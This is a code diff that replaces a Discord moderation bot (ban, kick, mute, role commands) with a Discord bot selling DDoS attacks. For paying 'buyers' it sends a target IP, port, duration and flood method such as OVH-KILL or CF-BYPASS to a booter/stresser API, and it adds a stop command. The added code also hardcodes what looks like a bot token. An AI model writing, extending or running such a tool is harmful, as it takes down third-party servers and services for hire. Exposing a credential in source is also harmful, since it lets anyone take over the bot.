@@ -1,274 +1,171 @@
-import os
-import disnake
-from disnake.ext import commands
-from dotenv import load_dotenv
+from discord.ext import commands
+from discord.ext.commands import Bot
+from os import system 
+from os import name
+import discord                       
+import aiohttp                       # For Api
+import random                      
+
+buyers  = [1]  # EDIT IT (Discord User ID)
+admins  = [1]  # EDIT IT (Discord User ID)
+owners  = [1]  # EDIT IT (Discord User ID)
+token   = 'MTMyODkzMDM0MDY4NDY5NzY1MQ.GmBr_U.fqjlo9BqktTdthunzQ4rB0vUiLv1TkOGNsJU1w' # EDIT IT (Bot Token)
+bot     = commands.Bot(command_prefix='.')
+
+l4methods = ['TCP-BYPASS', 'UDP-BYPASS', 'OVH-KILL', 'NFO-KILL']
+l7methods = ['HTTP-RAPE', 'HTTP-FLOOD', 'CF-BYPASS', 'DDOS-GUARD']
+__api = [
+    {
+        'api_url':'https://stresserapi.com/', # EDIT IT (Get an api by purchasing any stresser plan)
+        'api_key':'stresserapikey',      # EDIT IT (Get an api by purchasing any stresser plan)
+        'max_boot_time':'1800'                  # EDIT IT (Get an api by purchasing any stresser plan)
+    }
+]
+async def random_color():
+    random_number = random.randint(1, 999999)
+
+    while len(str(random_number)) != 6:
+        random_number = int(str(f'{random.randint(1, 9)}{random_number}'))
+
+    return random_number
+
+@bot.command()
+async def attack(ctx, method : str = None, hostip : str = None, port : str = None, time : str = None):
+    if ctx.author.id not in buyers:
+            await ctx.reply("You dont have access to use this command.", mention_author=False)
+
+    else:
+        if method is None or method.upper() == 'HELP':
+            l4methodstr = ''
+            l7methodstr = ''
+
+            for m in l4methods:
+                l4methodstr = f'{l4methodstr}{m}\n'
+
+            for m2 in l7methods:
+                l7methodstr = f'{l7methodstr}{m2}\n'
+
+            embed = discord.Embed(title="Attack Help", description=" .attack <method> <ip> <port> <time>", color=await random_color())
+            embed.add_field(name="Layer4 Methods: \n"f"{l4methodstr}", value= " DM Owners if you want to buy access.")
+            embed.add_field(name="Layer7 Methods: \n"f"{l7methodstr}", value = " DM Owners if you want to buy access.")                  
+            await ctx.reply(embed=embed, mention_author=False)
+
+        elif method is None: # no method
+            await ctx.reply("Enter a method for attack.", mention_author=False)
+            
+        elif method.upper() not in l4methods and method.upper() not in l7methods: # invalid method
+            await ctx.reply("Enter a valid method for attack.", mention_author=False)
+
+        elif hostip is None: # no ip
+            await ctx.reply("Enter a target for attack.", mention_author=False)
+
+        elif port is None: # no port
+            await ctx.reply("Enter a port for attack.", mention_author=False)
+
+        elif time is None: # no time
+            await ctx.reply("Enter a time for attack.", mention_author=False)
+
+        else: # correct format
+            for i in __api:
+                try:
+                    api_url = i["api_url"]
+                    api_key = i["api_key"]
+                    max_boot_time = int(i["max_boot_time"])
+
+                    if int(time) > max_boot_time:
+                        time2 = max_boot_time
+                        await ctx.reply(f'Max attack time for you is {max_boot_time} seconds, so attacking for {max_boot_time} seconds.', mention_author=False)
+
+                    else:
+                        time2 = int(time)
+
+                    async with aiohttp.ClientSession() as session:
+                        await session.post(f'{api_url}/?key={api_key}&host={hostip}&port={port}&time={time2}&method={method.upper()}')
+
+                except Exception as e:
+                    print(e)
+                    pass
+        if method.upper() in l7methods:
+            await ctx.reply("Attacked to " f"{hostip} for {time2} seconds.", mention_author=False)
+        elif method.upper() in l4methods:        
+            await ctx.reply("Attacked to " f"{hostip}:{port} for {time2} seconds.", mention_author=False)
+        else:
+            await ctx.reply("huh?", mention_author=False)
+
+@bot.command()
+async def stop(ctx, method : str = None, hostip : str = None, port : str = None, time : str = None):
+    if ctx.author.id not in owners:
+            await ctx.reply("This command is available for Owners only.", mention_author=False)
+
+    else:
+        if method is None or method.upper() == 'HELP':
+            l4methodstr = ''
+            l7methodstr = ''
+
+            for m in l4methods:
+                l4methodstr = f'{l4methodstr}{m}\n'
+
+            for m2 in l7methods:
+                l7methodstr = f'{l7methodstr}{m2}\n'
+
+            await ctx.reply("Usage: .stop <method> <ip> <port> <time>.", mention_author=False)
 
 
-load_dotenv()
-TOKEN = os.getenv("TOKEN")
+        elif method is None: # no method
+            await ctx.reply("Enter a method for stop attack.", mention_author=False)
+            
+        elif method.upper() not in l4methods and method.upper() not in l7methods: # invalid method
+            await ctx.reply("Enter a valid method for stop attack.", mention_author=False)
 
-# ======================================================
-# CONFIGURANDO INTENTS
-# ======================================================
+        elif hostip is None: # no ip
+            await ctx.reply("Enter a target for stop attack.", mention_author=False)
 
+        elif port is None: # no port
+            await ctx.reply("Enter a port for stop attack.", mention_author=False)
 
-intents = disnake.Intents.default()
-intents.members = True
-intents.message_content = True
+        elif time is None: # no time
+            await ctx.reply("Enter a time for stop attack.", mention_author=False)
 
-# ======================================================
-# CRIANDO O BOT
-# ======================================================
+        else: # correct format
+            for i in __api:
+                try:
+                    api_url = i["api_url"]
+                    api_key = i["api_key"]
+                    max_boot_time = int(i["max_boot_time"])
 
-bot = commands.InteractionBot(intents=intents)
+                    if int(time) > max_boot_time:
+                        time2 = max_boot_time
 
-# ======================================================
-# EVENTOS
-# ======================================================
+                    else:
+                        time2 = int(time)
+
+                    async with aiohttp.ClientSession() as session:
+                        await session.post(f'{api_url}/?key={api_key}&host={hostip}&port={port}&time={time2}&method=STOP') # this may be wrong but most stressers use STOP method for stop attacks.
+                
+                except Exception as e:
+                    print(e)
+                    pass
+        if method.upper() in l7methods:
+            await ctx.reply("Stopped attack for " f"{hostip}", mention_author=False)
+        elif method.upper() in l4methods:        
+            await ctx.reply("Stopped attack for " f"{hostip}:{port}.", mention_author=False)
+        else:
+            await ctx.reply("huh?", mention_author=False)
 @bot.event
 async def on_ready():
-    """Evento chamado quando o bot estiver online e pronto para uso."""
-    print(f"Bot está online! Logado como: {bot.user}")
+    if name == 'nt':
+        system('cls')
 
-@bot.event
-async def on_member_join(member: disnake.Member):
-    """
-    Mensagem de boas-vindas quando um usuário entra no servidor.
-    Ajuste 'channel_name' para o canal de boas-vindas que exista no seu servidor.
-    """
-    channel_name = "geral"  # Exemplo: "boas-vindas", "geral", etc.
-    channel = disnake.utils.get(member.guild.text_channels, name=channel_name)
-    if channel:
-        await channel.send(f"Bem-vindo(a), {member.mention}! Fique à vontade no servidor. :)")
+    else:
+        system('clear')
 
-# ======================================================
-# FUNÇÃO AUXILIAR PARA OBTER/CRIAR O CARGO "MUTED"
-# ======================================================
-async def get_or_create_muted_role(guild: disnake.Guild):
-    """
-    Retorna o cargo "Muted". Se não existir, cria e remove permissões de enviar mensagens.
-    """
-    role_name = "Muted"
-    muted_role = disnake.utils.get(guild.roles, name=role_name)
+    print(f'Logged in on {bot.user.name}. github.com/zKaan\n')
+    
+    if str(len(bot.guilds)) == 1:
+        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} server!"))
+        
+    else:
+        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(bot.guilds)} servers!"))
 
-    # Se não existir, criamos
-    if not muted_role:
-        try:
-            muted_role = await guild.create_role(
-                name=role_name,
-                permissions=disnake.Permissions(send_messages=False, speak=False),
-                reason="Criando cargo Muted para mutar membros."
-            )
-            # Remove a permissão de enviar mensagem de cada canal de texto
-            for channel in guild.text_channels:
-                await channel.set_permissions(muted_role, send_messages=False)
-            # Remove permissão de falar de cada canal de voz
-            for channel in guild.voice_channels:
-                await channel.set_permissions(muted_role, speak=False)
-
-        except Exception as e:
-            print(f"Erro ao criar cargo 'Muted': {e}")
-            return None
-
-    return muted_role
-
-# ======================================================
-# SLASH COMMANDS
-# ======================================================
-
-# -------------------------- BAN --------------------------
-@bot.slash_command(name="ban", description="Bane um membro do servidor.")
-@commands.has_permissions(ban_members=True)
-async def ban_member(
-    inter: disnake.ApplicationCommandInteraction,
-    member: disnake.Member,
-    reason: str = None
-):
-    """
-    Bane um membro do servidor e envia uma DM ao usuário com o motivo do ban.
-    Uso: /ban @usuario [motivo]
-    Permissão necessária: ban_members
-    """
-    # Evita banir a si mesmo ou o bot
-    if member == inter.author:
-        await inter.response.send_message("Você não pode banir a si mesmo!", ephemeral=True)
-        return
-    if member == bot.user:
-        await inter.response.send_message("Você não pode banir o próprio bot!", ephemeral=True)
-        return
-
-    dm_text = (
-        f"Você foi banido do servidor **{inter.guild.name}**.\n"
-        f"Motivo: {reason if reason else 'Não especificado'}"
-    )
-    try:
-        await member.send(dm_text)
-    except disnake.Forbidden:
-        pass
-    except Exception as e:
-        print(f"Erro ao enviar DM de ban: {e}")
-
-    # Agora, realiza o ban
-    try:
-        await member.ban(reason=reason)
-        await inter.response.send_message(
-            f"{member.mention} foi banido(a). Motivo: {reason if reason else 'Não especificado'}"
-        )
-    except Exception as e:
-        await inter.response.send_message(f"Não foi possível banir o usuário. Erro: {e}", ephemeral=True)
-
-# -------------------------- KICK --------------------------
-@bot.slash_command(name="kick", description="Expulsa um membro do servidor.")
-@commands.has_permissions(kick_members=True)
-async def kick_member(
-    inter: disnake.ApplicationCommandInteraction,
-    member: disnake.Member,
-    reason: str = None
-):
-    """
-    Kicka (expulsa) um membro do servidor.
-    Uso: /kick @usuario [motivo]
-    Permissão necessária: kick_members
-    """
-    if member == inter.author:
-        await inter.response.send_message("Você não pode expulsar a si mesmo!", ephemeral=True)
-        return
-    if member == bot.user:
-        await inter.response.send_message("Você não pode expulsar o próprio bot!", ephemeral=True)
-        return
-
-    try:
-        await member.kick(reason=reason)
-        await inter.response.send_message(
-            f"{member.mention} foi expulso(a). Motivo: {reason if reason else 'Não especificado'}"
-        )
-    except Exception as e:
-        await inter.response.send_message(f"Não foi possível expulsar o usuário. Erro: {e}", ephemeral=True)
-
-# -------------------------- MUTE --------------------------
-@bot.slash_command(name="mute", description="Muta um membro (impede de falar/teclar).")
-@commands.has_permissions(manage_roles=True)
-async def mute_member(
-    inter: disnake.ApplicationCommandInteraction,
-    member: disnake.Member,
-    reason: str = None
-):
-    """
-    Muta um membro, atribuindo o cargo "Muted".
-    Uso: /mute @usuario [motivo]
-    Permissão necessária: manage_roles
-    """
-    # Impede que alguém mute a si mesmo ou o bot
-    if member == inter.author:
-        await inter.response.send_message("Você não pode mutar a si mesmo!", ephemeral=True)
-        return
-    if member == bot.user:
-        await inter.response.send_message("Você não pode mutar o bot!", ephemeral=True)
-        return
-
-    muted_role = await get_or_create_muted_role(inter.guild)
-    if not muted_role:
-        await inter.response.send_message("Não foi possível criar ou encontrar o cargo 'Muted'.", ephemeral=True)
-        return
-
-    if muted_role in member.roles:
-        await inter.response.send_message(f"{member.mention} já está mutado(a).", ephemeral=True)
-        return
-
-    try:
-        await member.add_roles(muted_role, reason=reason)
-        await inter.response.send_message(
-            f"{member.mention} foi mutado(a). Motivo: {reason if reason else 'Não especificado'}"
-        )
-    except Exception as e:
-        await inter.response.send_message(f"Erro ao mutar usuário: {e}", ephemeral=True)
-
-# -------------------------- UNMUTE --------------------------
-@bot.slash_command(name="unmute", description="Desmuta um membro.")
-@commands.has_permissions(manage_roles=True)
-async def unmute_member(
-    inter: disnake.ApplicationCommandInteraction,
-    member: disnake.Member
-):
-    """
-    Desmuta um membro, removendo o cargo "Muted".
-    Uso: /unmute @usuario
-    Permissão necessária: manage_roles
-    """
-    muted_role = disnake.utils.get(inter.guild.roles, name="Muted")
-    if not muted_role:
-        await inter.response.send_message("O cargo 'Muted' não existe neste servidor.", ephemeral=True)
-        return
-
-    if muted_role not in member.roles:
-        await inter.response.send_message(f"{member.mention} não está mutado(a).", ephemeral=True)
-        return
-
-    try:
-        await member.remove_roles(muted_role)
-        await inter.response.send_message(f"{member.mention} foi desmutado(a).")
-    except Exception as e:
-        await inter.response.send_message(f"Erro ao desmutar usuário: {e}", ephemeral=True)
-
-# -------------------------- ADDROLE --------------------------
-@bot.slash_command(name="addrole", description="Adiciona um cargo a um membro.")
-@commands.has_permissions(manage_roles=True)
-async def add_role_to_member(
-    inter: disnake.ApplicationCommandInteraction,
-    member: disnake.Member,
-    role: disnake.Role
-):
-    """
-    Adiciona um cargo a um membro.
-    Uso: /addrole @usuario @cargo
-    Permissão necessária: manage_roles
-    """
-    if role in member.roles:
-        await inter.response.send_message(
-            f"{member.mention} já possui o cargo {role.name}.",
-            ephemeral=True
-        )
-        return
-
-    try:
-        await member.add_roles(role)
-        await inter.response.send_message(
-            f"Cargo {role.name} adicionado a {member.mention} com sucesso!"
-        )
-    except Exception as e:
-        await inter.response.send_message(f"Erro ao adicionar cargo: {e}", ephemeral=True)
-
-# -------------------------- REMOVEROLE --------------------------
-@bot.slash_command(name="removerole", description="Remove um cargo de um membro.")
-@commands.has_permissions(manage_roles=True)
-async def remove_role_from_member(
-    inter: disnake.ApplicationCommandInteraction,
-    member: disnake.Member,
-    role: disnake.Role
-):
-    """
-    Remove um cargo de um membro.
-    Uso: /removerole @usuario @cargo
-    Permissão necessária: manage_roles
-    """
-    if role not in member.roles:
-        await inter.response.send_message(
-            f"{member.mention} não possui o cargo {role.name}.",
-            ephemeral=True
-        )
-        return
-
-    try:
-        await member.remove_roles(role)
-        await inter.response.send_message(
-            f"Cargo {role.name} removido de {member.mention} com sucesso!"
-        )
-    except Exception as e:
-        await inter.response.send_message(f"Erro ao remover cargo: {e}", ephemeral=True)
-
-
-# ======================================================
-# EXECUTA O BOT
-# ======================================================
-if __name__ == "__main__":
-    bot.run(TOKEN)
+if __name__ == '__main__':
+    bot.run(token)
